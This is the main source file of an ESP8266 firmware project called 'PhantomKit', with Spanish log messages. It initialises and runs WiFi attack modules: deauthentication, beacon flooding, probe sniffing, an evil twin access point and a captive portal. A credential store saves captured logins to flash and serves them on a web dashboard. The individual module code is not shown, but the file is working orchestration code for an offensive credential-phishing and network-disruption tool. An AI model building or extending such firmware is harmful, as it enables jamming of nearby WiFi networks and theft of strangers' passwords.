#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>
#include "config.h"
#include "wifi/ap_manager.h"
#include "wifi/dns_server.h"
#include "wifi/web_server.h"
#include "wifi/deauth.h"
#include "wifi/beacon_flood.h"
#include "wifi/probe_sniffer.h"
#include "wifi/evil_twin.h"
#include "wifi/auto_portal.h"
#include "wifi/channel_hopper.h"
#include "portal/captive_portal.h"
#include "portal/credential_store.h"

// Global state
String logBuffer = "";

// Module instances
APManager apManager;
PhantomDNSServer dnsServer;
CredentialStore credStore(MAX_CREDENTIALS);
CaptivePortal captivePortal(credStore);
PhantomWebServer* webServer = nullptr;
ChannelHopper channelHopper;

// Attack modules
DeauthModule deauthModule;
BeaconFloodModule beaconModule;
ProbeSnifferModule probeModule;
EvilTwinModule evilTwinModule;
AutoPortalModule autoPortalModule;

void addLog(const String& msg) {
    unsigned long secs = millis() / 1000;
    String timestamp = String(secs / 3600) + ":" + String((secs % 3600) / 60) + ":" + String(secs % 60);
    logBuffer += "[" + timestamp + "] " + msg + "\n";
    
    int maxLines = 100;
    int lines = 0;
    int pos = 0;
    while ((pos = logBuffer.indexOf('\n', pos)) != -1) {
        lines++;
        pos++;
    }
    if (lines > maxLines) {
        int firstNewline = logBuffer.indexOf('\n');
        logBuffer = logBuffer.substring(firstNewline + 1);
    }
    
    Serial.println(msg);
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    addLog("ESP8266 PhantomKit iniciando...");
    addLog("Version 2.0 - Todos los modulos activos");
    
    if (!LittleFS.begin()) {
        addLog("ERROR: LittleFS no se pudo montar");
    } else {
        addLog("LittleFS montado correctamente");
        credStore.loadFromDisk();
        addLog("Credenciales cargadas desde disco: " + String(credStore.getCount()));
    }
    
    apManager.begin(AP_SSID, AP_PASSWORD, AP_CHANNEL);
    addLog("WiFi AP iniciado: " + String(AP_SSID) + " Canal: " + String(AP_CHANNEL));
    
    dnsServer.begin(WiFi.softAPIP());
    addLog("DNS Server iniciado");
    
    channelHopper.begin(AP_CHANNEL);
    addLog("Channel Hopper iniciado");
    
    deauthModule.begin();
    beaconModule.begin();
    probeModule.begin();
    evilTwinModule.begin();
    autoPortalModule.begin();
    
    webServer = new PhantomWebServer(credStore, captivePortal, apManager, 
                                      deauthModule, beaconModule, probeModule, 
                                      evilTwinModule, autoPortalModule);
    webServer->begin();
    
    captivePortal.begin(webServer->getServer());
    
    addLog("Dashboard web: http://" + WiFi.softAPIP().toString() + "/dashboard");
    addLog("PhantomKit listo. Conectate a: " + String(AP_SSID));
}

void loop() {
    dnsServer.processNextRequest();
    
    if (webServer) {
        webServer->handleClient();
    }
    
    // Channel hopping
    channelHopper.update();
    
    // Update attack modules
    beaconModule.update();
    deauthModule.update();
    probeModule.update();
    evilTwinModule.update();
    
    // Auto-portal analysis
    if (autoPortalModule.isScanning()) {
        autoPortalModule.analyzeResults();
    }
    
    delay(1);
}
